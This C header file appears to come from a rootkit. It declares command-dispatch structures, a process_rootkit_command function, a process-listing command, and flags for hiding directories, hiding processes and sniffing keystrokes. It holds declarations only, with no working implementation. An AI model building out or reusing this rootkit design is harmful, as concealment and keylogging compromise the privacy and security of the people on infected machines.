typedef void (* COMMANDPROC)(int, PVOID);

typedef struct tagCOMMAND
{
	BYTE		byCode;
	COMMANDPROC	proc;
} COMMAND, * LPCOMMAND;

typedef struct tagCOMMANDPACKET
{
	BYTE	byCode;
	WORD	cchData;
	BYTE	byData[];
} COMMANDPACKET, * LPCOMMANDPACKET;

void process_rootkit_command(char *theCommand);

///////////////////////////////////////////////////////////
// command functions
///////////////////////////////////////////////////////////
void command_get_proclist();

extern BOOL g_hide_directories;
extern BOOL g_hide_proc;
extern BOOL g_sniff_keys;